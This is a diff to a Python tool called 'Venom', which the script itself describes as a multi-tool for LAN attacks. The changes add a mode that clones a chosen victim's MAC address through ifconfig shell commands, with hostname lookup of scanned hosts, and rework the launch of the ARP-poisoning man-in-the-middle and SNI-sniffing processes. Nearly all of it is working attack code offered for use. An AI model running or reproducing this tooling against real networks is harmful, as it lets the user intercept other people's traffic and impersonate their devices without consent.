@@ -1,10 +1,13 @@
 from scapy.all import *
 import scapy.all as scapy
 from scapy.all import ARP, Ether, srp
+from scapy.all import IP, DNSRR, DNSQR, UDP, DNS
 import cryptography
 from datetime import datetime
 from multiprocessing import Process
 import argparse
+import os
+import socket
 
 # Load every useful layers
 load_layer("tls")
@@ -12,18 +15,25 @@ load_layer("http")
 load_layer("dns")
 
 # Initializing Args
-parser = argparse.ArgumentParser(description='Venom is a multi tool that setup an MiTM via ARP Poisoning, giving access to different attack vectors.')
-parser.add_argument("-n", "--nuke", help="Using Nuke attack mode", action="store_true")
-parser.add_argument("-s", "--sniper", help="Using Sniper attack mode", action="store_true")
+parser = argparse.ArgumentParser(description='Venom is a multi tool for LAN Network attacks (MiTM / MAC-Spoofing / Sniffing...).')
+g = parser.add_mutually_exclusive_group()
+parser.add_argument("-n", "--nuke", help="Using Nuke poisoning mode", action="store_true")
+parser.add_argument("-s", "--sniper", help="Using Sniper poisoning mode", action="store_true")
 parser.add_argument("-ss", "--scan_speed", help="Choosing ARP Scan speed (1-5)", default=4, type=int)
 parser.add_argument("-ml", "--mac_lookup", help="Mac Address Lookup when ARP scanning", action="store_true")
 parser.add_argument("-ir", "--ip_range", help="Targeted IP range", default="192.168.1.1/24", type=str)
+g.add_argument("-sni", "--sni", help="SNI Sniffing attack", action="store_true")
+g.add_argument("-mac", "--mac_spoofer", help="MAC Address Spoofing", action="store_true")
+g.add_argument("-sc", "--scan", help="Simple ARP Scanning for host discovery", action="store_true")
+parser.add_argument("-iface", "--iface", help="Specify the Iface you want to change the MAC Address of", default="eth0", type=str)
+
 args = parser.parse_args()
 
 my_Mac = Ether().src
 my_IP = get_if_addr(conf.iface)
 arp_scan_mode = args.scan_speed
 mac_look_up = args.mac_lookup
+iface = args.iface
 
 def ARP_Scan():
     target_ip = args.ip_range
@@ -56,17 +66,27 @@ def targets_table(targets):
         if target["ip"] != my_IP and target["ip"] != router_ip:
             target_ip = target["ip"]
             target_mac = target["mac"]
+            hostname = socket.gethostbyaddr(target_ip)[0]
+            hostname = hostname.split(".")
             i = i + 1
             p_targets.append({'ip': target_ip, 'mac': target_mac})
             
             if mac_look_up:
                 mac_info = mac_lookup(target_mac)
-                print("| Target #"+ str(i) +" | IP: " + str(target_ip) + " | MAC: " + str(target_mac) + " | INFO: {:<12} |".format(mac_info))
-                print("==============================================================================")
+                print("| Target #"+ str(i) +" | IP: " + str(target_ip) + " | MAC: " + str(target_mac) + " | HOST: {:<15} | INFO: {:<12} |".format(hostname[0], mac_info))
+                print("======================================================================================================")
             else:
-                print("| Target #"+ str(i) +" | IP: " + str(target_ip) + " | MAC: " + str(target_mac) + " |")
-                print("=========================================================")
+                print("| Target #"+ str(i) +" | IP: " + str(target_ip) + " | MAC: " + str(target_mac) + " | HOST: {:<15} |".format(hostname[0]))
+                print("=================================================================================")
     return p_targets
+
+def change_mac_address(spoofed_mac_address):
+    # disable the network interface
+    subprocess.check_output(f"ifconfig {iface} down", shell=True)
+    # change the MAC
+    subprocess.check_output(f"ifconfig {iface} hw ether {spoofed_mac_address}", shell=True)
+    # enable the network interface again
+    subprocess.check_output(f"ifconfig {iface} up", shell=True)
 
 def spoof(target_ip, target_mac, router_ip, router_mac):
     # Spoofing Router
@@ -141,7 +161,6 @@ def multi_sniff(target_ip):
 def sniping_loop(p_targets, target_num, router_ip, router_mac):
     while True:
         try:
-            attempts = 0
             i = 0
             for target in p_targets:
                 i = i + 1
@@ -155,13 +174,6 @@ def sniping_loop(p_targets, target_num, router_ip, router_mac):
                         time.sleep(2)
                     except KeyboardInterrupt:
                         break
-                    except:
-                        if attempts <= 3:
-                            print("\n[POISON] - Can't reach " + str(target_ip) + " ! | Attempt " + str(attempts) + "...")
-                            attempts = attempts + 1
-                        else:
-                            print("\n[POISON] - Can't reach " + str(target_ip) + " after 3 attempts ! | Exiting...") 
-                            break
         except:
             break
             
@@ -188,10 +200,14 @@ def nuke_loop(p_targets, router_ip, router_mac):
 if __name__ == '__main__':
 
     # Checking if Attack mode is selected correclty
-    if not (args.nuke or args.sniper):
-        parser.error('No attack mode selected, add --nuke or --sniper')
-    if (args.nuke and args.sniper):
+    if not (args.scan or args.sni or args.mac_spoofer):
+        parser.error('No attack selected, choose between: --scan / --sni / --mac_spoofer')
+    if (args.sni and args.nuke and args.sniper):
         parser.error('Both attack mode selected, choose --nuke or --sniper')
+    if (args.sni and not args.nuke and not args.sniper):
+        parser.error('No attack mode selected, choose --nuke or --sniper')
+    #if (args.scan and args.sni and args.mac_spoofer):
+    #    parser.error('Please only pick one attack, choose between: --scan / --sni / --mac_spoofer')
 
     # Clear Terminal
     os.system('cls' if os.name == 'nt' else 'clear')
@@ -217,7 +233,7 @@ if __name__ == '__main__':
                    .,ccldxxxo:'        .:oxxxxolc,.       
                          ...              ...
                                                                        
-                                            •°¯`•• v.1.0 by.Haash ••`¯°•  """)
+                                            •°¯`•• v.1.0.1 by.Haash ••`¯°•  """)
 
     # Wait for User to press "Enter" to launch ARP Scan
     input("\n[+] Press Enter to Start... ")
@@ -227,16 +243,16 @@ if __name__ == '__main__':
 
     # checking for Router IP/MAC
     for target in targets:
-        if target["ip"] == "192.168.1.1" or target["ip"] == "10.0.0.1":
+        if target["ip"] == "192.168.1.1" or target["ip"] == "10.0.0.1"  or target["ip"] == "192.168.1.254":
             router_mac = target["mac"]
             router_ip = target["ip"]
 
     # Checking all available targets
     print("\n[+] " + str(len(targets) - 1) + " Targets Found: ")
     if args.mac_lookup:
-        print("==============================================================================")
+        print("======================================================================================================")
     else:
-        print("\n=========================================================")
+        print("\n=================================================================================")
 
     # Showing targets table
     p_targets = targets_table(targets)
@@ -257,9 +273,13 @@ if __name__ == '__main__':
         elif relaunch.lower() == "no" or relaunch.lower() == "n":
             break
 
-    # If Sniper Mode selected, let user choose the target
-    if args.sniper:
-        target_num = input("\n[+] Which device would you like to target ? (1/2/3/4/...): ")
+    # If User choosed ARP-Scanning / Show targets table then exit
+    if args.scan:
+        sys.exit()
+
+    # If User choosed Mac Spoofer / 
+    elif args.mac_spoofer:
+        target_num = input("\n[+] Which device MAC address would you like to Spoof ? (1/2/3/4/...): ")
         while target_num == "0" or int(target_num) > len(p_targets):
             target_num = input("\n[+] Please select a valid target ! (1/2/3/4/...): ")
         i = 0
@@ -268,46 +288,109 @@ if __name__ == '__main__':
             if i == int(target_num):
                 target_ip = target["ip"]
                 target_mac = target["mac"]
-                print("\n[+] Poisoning Target n°" + str(target_num) + " [" + str(target_ip) +"]...")
+                input("\n[+] Spoofing ready on Target n°" + str(target_num) + " ! | [" + str(my_Mac) + " => " +  str(target_mac) + "] ! Press Enter to Spoof...")
                 print("\n============================================================================\n")
                 break
-    # Set Nuke Mode*
-    elif args.nuke:
-        input("\n[+] Nuke mode ready ! Press Enter to launch the attack... ")
-        print("\n============================================================================\n")
-    
-    # Launching Nuke attack
-    try:
-        if args.nuke:
-            try:
-                p1 = Process(target=nuke_loop, args=(p_targets, router_ip, router_mac))
-                p2 = Process(target=nuke_sniffing, args=(p_targets,))
-                p1.start()
-                time.sleep(3)
-                p2.start()
-                p1.join()
-                p2.join()
-            except:
-                p1.terminate()
-                p2.terminate()
-                pass
+        try:
+            change_mac_address(target_mac)
+            dt = datetime.now()
+            spoofed_mac = Ether().src
+        except:
+            spoofed_mac = Ether().src
+            print("[ERROR] - [" + str(dt) + "] - [" + str(spoofed_mac) + "] MAC Address Spoofing Failed !")
+            sys.exit()
 
-    # Launching Sniping attack
-        elif args.sniper:
+        if my_Mac == spoofed_mac:
+            print("[SPOOF] - [" + str(dt) + "] - [" + str(spoofed_mac) + "] | MAC Address Spoofing Failed !")
+            sys.exit() 
+        else:
+            print("[SPOOF] - [" + str(dt) + "] - [" + str(spoofed_mac) + "] | Target #" + str(i) + " MAC Address Spoofed Succesfully !")
+            # Show User Old / New MAC Addresses
+            print("[SPOOF] - [" + str(dt) + "] - [" + str(target_mac) + "] | Old MAC Address: " + my_Mac)
+            print("[SPOOF] - [" + str(dt) + "] - [" + str(target_mac) + "] | New MAC Address: " + spoofed_mac)
+            # Wait for user to press a Key to Restore MAC Address
+            print("\n============================================================================")
+            input("\n[+] - [" + str(spoofed_mac) + " => " +  str(my_Mac) +"] | Press Enter to restore MAC... ")
             try:
-                p1 = Process(target=sniping_loop, args=(p_targets, target_num, router_ip, router_mac))
-                p2 = Process(target=sniping_sniffing, args=(p_targets, target_num))
-                p1.start()
-                time.sleep(3)
-                p2.start()
-                p1.join()
-                p2.join()
+                change_mac_address(my_Mac)
+                dt = datetime.now()
+                restored_mac = Ether().src
             except:
-                p1.terminate()
-                p2.terminate()
-                pass
-    except:
-        pass
+                restored_mac = Ether().src
+                print("\n[ERROR] - [" + str(dt) + "] - [" + str(restored_mac) + "] | Restoring Failed !")
+                sys.exit()
+            if restored_mac == my_Mac:
+                print("\n============================================================================\n")
+                print("[RESTORE] - [" + str(dt) + "] - [" + str(spoofed_mac) + "] | MAC Address Restored Succesfully !")
+                print("[RESTORE] - [" + str(dt) + "] - [" + str(target_mac) + "] | Old MAC Address: " + spoofed_mac)
+                print("[RESTORE] - [" + str(dt) + "] - [" + str(target_mac) + "] | New MAC Address: " + restored_mac)
+                print("\n============================================================================\n")
+                sys.exit()
+            else:
+                print("\n[ERROR] - [" + str(dt) + "] - [" + str(target_mac) + "] | Target #" + str(i) + " Restoring Failed !")
+                sys.exit()
+            
+
+    elif args.sni:
+        # If Sniper Mode selected, let user choose the target
+        if args.sniper:
+            target_num = input("\n[+] Which device would you like to target ? (1/2/3/4/...): ")
+            while target_num == "0" or int(target_num) > len(p_targets):
+                target_num = input("\n[+] Please select a valid target ! (1/2/3/4/...): ")
+            i = 0
+            for target in p_targets:
+                i = i + 1
+                if i == int(target_num):
+                    target_ip = target["ip"]
+                    target_mac = target["mac"]
+                    input("\n[+] Sniping ready on Target n°" + str(target_num) + " [" + str(target_ip) +"] ! Press Enter to launch the attack...")
+                    print("\n============================================================================\n")
+                    break
+        # Set Nuke Mode*
+        elif args.nuke:
+            input("\n[+] Nuke mode ready ! Press Enter to launch the attack... ")
+            print("\n============================================================================\n")
+
+        # Launching Nuke attack
+        try:
+            if args.nuke:
+                try:
+                    arp_spoof = Process(target=nuke_loop, args=(p_targets, router_ip, router_mac))
+                    sni_sniffing = Process(target=nuke_sniffing, args=(p_targets,))
+                    arp_spoof.start()
+                    if args.sni:
+                        time.sleep(3)
+                        sni_sniffing.start()
+                        arp_spoof.join()
+                        sni_sniffing.join()
+                    else:
+                        arp_spoof.join()
+                except:
+                    arp_spoof.terminate()
+                    if args.sni:
+                        sni_sniffing.terminate()
+                    pass
+
+        # Launching Sniping attack
+            elif args.sniper:
+                try:
+                    arp_spoof = Process(target=sniping_loop, args=(p_targets, target_num, router_ip, router_mac))
+                    sni_sniffing = Process(target=sniping_sniffing, args=(p_targets, target_num))
+                    arp_spoof.start()
+                    if args.sni:
+                        time.sleep(3)
+                        sni_sniffing.start()
+                        arp_spoof.join()
+                        sni_sniffing.join()
+                    else:
+                        arp_spoof.join()
+                except:
+                    arp_spoof.terminate()
+                    if args.sni:
+                        sni_sniffing.terminate()
+                    pass
+        except:
+            pass
 
     print("\n===============================")
     print("=== [-] Spoofing Canceled ! ===")
